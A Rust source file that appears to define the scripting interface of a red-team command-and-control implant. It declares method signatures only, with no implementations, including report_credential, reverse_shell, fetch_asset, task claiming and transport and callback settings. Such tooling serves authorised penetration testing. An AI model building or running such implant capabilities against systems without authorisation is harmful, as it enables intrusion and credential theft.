#![allow(clippy::mutable_key_type)]
extern crate alloc;

use alloc::string::String;
use alloc::vec::Vec;
use eldritch_core::Value;
use eldritch_macros::{eldritch_library, eldritch_method};

use alloc::collections::BTreeMap;

#[cfg(feature = "fake_bindings")]
pub mod fake;

#[cfg(feature = "stdlib")]
pub mod agent;
#[cfg(feature = "stdlib")]
pub mod conversion;
#[cfg(feature = "stdlib")]
pub mod std;

#[cfg(feature = "stdlib")]
use conversion::*;

#[eldritch_library("agent")]
pub trait AgentLibrary {
    #[eldritch_method]
    fn get_config(&self) -> Result<BTreeMap<String, Value>, String>;

    #[eldritch_method]
    fn get_id(&self) -> Result<String, String>;

    #[eldritch_method]
    fn get_platform(&self) -> Result<String, String>;

    #[eldritch_method]
    fn _terminate_this_process_clowntown(&self) -> Result<(), String>;

    #[eldritch_method]
    fn set_config(&self, config: BTreeMap<String, Value>) -> Result<(), String>;

    #[eldritch_method]
    fn sleep(&self, secs: i64) -> Result<(), String>;

    // Interactivity
    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn fetch_asset(&self, name: String) -> Result<Vec<u8>, String>;

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn report_credential(&self, credential: CredentialWrapper) -> Result<(), String>;

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn report_file(&self, file: FileWrapper) -> Result<(), String>;

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn report_process_list(&self, list: ProcessListWrapper) -> Result<(), String>;

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn report_task_output(&self, output: String, error: Option<String>) -> Result<(), String>;

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn reverse_shell(&self) -> Result<(), String>;

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn claim_tasks(&self) -> Result<Vec<TaskWrapper>, String>;

    // Agent Configuration
    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn get_transport(&self) -> Result<String, String>;

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn set_transport(&self, transport: String) -> Result<(), String>;

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn add_transport(&self, transport: String, config: String) -> Result<(), String>;

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn list_transports(&self) -> Result<Vec<String>, String>;

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn get_callback_interval(&self) -> Result<i64, String>; // i64 because Eldritch ints are i64

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn set_callback_interval(&self, interval: i64) -> Result<(), String>;

    // Task Management
    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn list_tasks(&self) -> Result<Vec<TaskWrapper>, String>;

    #[cfg(feature = "stdlib")]
    #[eldritch_method]
    fn stop_task(&self, task_id: i64) -> Result<(), String>;
}
